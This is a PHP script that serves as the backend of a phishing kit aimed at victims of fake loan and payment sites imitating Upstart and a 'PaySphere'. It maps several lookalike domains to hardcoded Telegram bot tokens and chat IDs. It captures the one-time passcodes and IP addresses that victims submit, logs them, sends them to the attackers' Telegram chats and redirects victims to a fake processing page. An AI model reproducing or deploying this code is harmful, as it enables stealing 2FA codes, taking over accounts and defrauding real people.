<?php
// =========================================
// 🔐 UNIVERSAL CONFIRM OTP HANDLER (Multi-site)
// =========================================
// include 'firewall.php';

// 🌐 Define your site-specific configurations here
$site_map = [
    'upstartloan.rf.gd' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '7775401700:AAFsyHpfgM9kNryQozLz8Mjmp5lDeaG0D44', 'chat_id' => '7510889526']

        ],
        'redirect' => 'https://upstartloan.rf.gd/cache_site/processing.html'
    ],

    'upstarts.onrender.com' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '8187021949:AAED4PdfxR4o4oRJjLMht3UnBDp52FFG8Ok', 'chat_id' => '5768557636']
        ],
        'redirect' => 'https://upstarts.onrender.com/cache_site/processing.html'
    ],

    'upstart-l69v.onrender.com' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '7775401700:AAFsyHpfgM9kNryQozLz8Mjmp5lDeaG0D44', 'chat_id' => '7510889526']
        ],
        'redirect' => 'https://upstart-l69v.onrender.com/cache_site/processing.html'
    ],

    'upstartloans-704y.onrender.com' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '8173202881:AAFk6jNXvJ-5b4ZNH0gV8IfmEnOW7qdJO8U', 'chat_id' => '7339107338']
        ],
        'redirect' => 'https://upstartloans-704y.onrender.com/cache_site/processing.html'
    ],

    
    'upstartsloan.42web.io' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '5651009105:AAHaRNsOqggJM3Fl9sgRewqnXJJ7Dc326Rw', 'chat_id' => '2004020590']

        ],
        'redirect' => 'https://upstartsloan.42web.io/cache_site/processing.html'
    ],

    'paysphere.42web.io' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            
            ['token' => '8327467242:AAFFBheM0nU1-45BKH5vAvdfXKhgXPopJvg', 'chat_id' => '7919111838']

        ],
        'redirect' => 'https://paysphere.42web.io/cache_site/careers/all-listings.job.34092/processing.html'
    ],



];


// 🧾 Logging utility
$log_file = 'submission_log.txt';
function logToFile($data, $file) {
    $entry = "[" . date("Y-m-d H:i:s") . "] $data\n";
    file_put_contents($file, $entry, FILE_APPEND);
}

// 📬 Telegram message sender
function sendToBots($message, $bots) {
    foreach ($bots as $bot) {
        $url = "https://api.telegram.org/bot{$bot['token']}/sendMessage";
        $data = [
            'chat_id' => $bot['chat_id'],
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_RETURNTRANSFER => true
        ]);
        curl_exec($ch);
        curl_close($ch);
    }
}

// 🧠 Main logic
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $otp = htmlspecialchars($_POST['otpconfirm'] ?? '???');
    $ip = htmlspecialchars($_POST['ip'] ?? 'No ip');
    $referer = $_SERVER['HTTP_REFERER'] ?? '';
    $domain = parse_url($referer, PHP_URL_HOST) ?? 'unknown';
    $timestamp = date("Y-m-d H:i:s");

    $msg = "✅ *OTP Confirmation from $domain*\n\n" .
           "🔒 *Code:* $otp\n" .
           "🌐 *IP:* $ip\n" .
           "⏰ *Time:* $timestamp";

    logToFile("[$domain] Confirm OTP: $otp | IP: $ip", $log_file);

    if (isset($site_map[$domain])) {
        $config = $site_map[$domain];
        sendToBots($msg, $config['bots']);
        header("Location: " . $config['redirect']);
        exit;
    } else {
        logToFile("❌ Unauthorized domain: $domain", $log_file);
        exit("Unauthorized");
    }
}
?>
